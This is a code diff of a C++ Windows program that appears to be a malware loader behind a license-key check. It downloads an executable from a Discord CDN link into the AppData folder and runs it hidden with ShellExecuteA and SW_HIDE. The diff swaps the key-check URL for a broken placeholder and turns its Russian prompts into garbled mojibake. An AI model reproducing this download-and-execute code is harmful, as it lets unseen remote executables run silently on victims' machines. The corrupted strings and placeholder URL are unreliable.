@@ -31,7 +31,7 @@ void SetRandomTitle() {
 }
 
 string bussdown = ("https://cdn.discordapp.com/attachments/952991044008554576/991655723547234354/1144.exe");
-string query = ("https://pastebin.com/raw/15EkCDEu");
+string query = ("https://u site");
 string appdata = getenv("APPDATA");
 
 string replaceAll(string subject, const string& search, const string& replace) {
@@ -78,19 +78,19 @@ int main() {
     _getch();
 #endif
 
-    cout << ("\n\n Ââåäèòå Êëþ÷: ");
+    cout << ("\n\n Ã‚Ã¢Ã¥Ã¤Ã¨Ã²Ã¥ ÃŠÃ«Ã¾Ã·: ");
     cin >> key;
     (key);
     system("cls");
 
     
-    cout << "\n\n Ïðîâåðÿåì òâîé êëþ÷ ";
+    cout << "\n\n ÃÃ°Ã®Ã¢Ã¥Ã°Ã¿Ã¥Ã¬ Ã²Ã¢Ã®Ã© ÃªÃ«Ã¾Ã· ";
     Sleep(1400);
     system("cls");
 
     if ((key) != DownloadString(query)) {
 
-        cout << ("\n\n Âàøà êëþ÷ íå áûë îáíàðóæåí") << endl;
+        cout << ("\n\n Ã‚Ã Ã¸Ã  ÃªÃ«Ã¾Ã· Ã­Ã¥ Ã¡Ã»Ã« Ã®Ã¡Ã­Ã Ã°Ã³Ã¦Ã¥Ã­") << endl;
         Sleep(2000);
         exit(-1);
 
@@ -98,13 +98,13 @@ int main() {
 
 
     appdata += "\\1144.exe"; 
-    cout << "Íàø ôàéë áóäåò íàõîäèòüñÿ ïî ïóòè: " + appdata << endl;
-    cout << "Èäåò ñêà÷êà ôàéëà \n";
+    cout << "ÃÃ Ã¸ Ã´Ã Ã©Ã« Ã¡Ã³Ã¤Ã¥Ã² Ã­Ã ÃµÃ®Ã¤Ã¨Ã²Ã¼Ã±Ã¿ Ã¯Ã® Ã¯Ã³Ã²Ã¨: " + appdata << endl;
+    cout << "ÃˆÃ¤Ã¥Ã² Ã±ÃªÃ Ã·ÃªÃ  Ã´Ã Ã©Ã«Ã  \n";
     HRESULT hr = URLDownloadToFileA(NULL, bussdown.c_str(), appdata.c_str(), 0, 0); 
 
     if (hr == S_OK) 
     {
-        cout << "Ôàéë óñïåøíî ñêà÷àí, îòêðûâàåì åãî\n";
+        cout << "Ã”Ã Ã©Ã« Ã³Ã±Ã¯Ã¥Ã¸Ã­Ã® Ã±ÃªÃ Ã·Ã Ã­, Ã®Ã²ÃªÃ°Ã»Ã¢Ã Ã¥Ã¬ Ã¥Ã£Ã®\n";
         ShellExecuteA(NULL, "open", appdata.c_str(), NULL, NULL, SW_HIDE); 
     }
 
